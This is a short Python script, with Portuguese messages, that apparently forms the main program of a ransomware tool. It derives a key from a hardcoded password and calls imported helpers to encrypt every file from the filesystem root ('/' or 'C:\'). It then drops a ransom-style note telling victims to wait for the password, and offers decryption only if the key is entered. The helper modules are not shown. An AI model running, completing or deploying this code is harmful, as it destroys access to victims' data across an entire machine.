import os
import hashlib

from utils.get_key import get_key
from utils.decrypt import scan_and_decrypt
from utils.encrypt import scan_and_encrypt

def ask_for_key():
    key = get_key()

    if key is None:
        print("Chave não fornecida. A operação foi cancelada.")
        return None

    key = hashlib.sha256(key.encode()).digest()
    return key

if __name__ == "__main__":
    key = hashlib.sha256("nenhumsistemaestaasalvo".encode()).digest()

    directory = "/" if os.name != "nt" else "C:\\"
    scan_and_encrypt(directory, key)

    print(
            "Criptografia concluída. Agora, forneça a chave para descriptografar os arquivos."
            )

    file_name = "novo_arquivo.txt"

    try:
        # Usando o modo 'x' para criar o arquivo (gera erro se o arquivo já existir)
        with open(file_name, 'x') as file:
            file.write("Instrucoes: .\n")
            file.write("Na verdade nao tem muitas, apenas aguarde, nao precisa de panico .\n")
            file.write("Nao queremos dinheiro, queremos so tempo.\n")
            file.write("So aguarda, a senha chegara para voces.\n")
    except FileExistsError:
        print(f"Erro: O arquivo '{file_name}' já existe.")

    decryption_key = ask_for_key()

    if decryption_key:
        print("Descriptografando arquivos...")
        scan_and_decrypt(directory, decryption_key)
    else:
        print("Nenhuma chave fornecida. Descriptografia não realizada.")
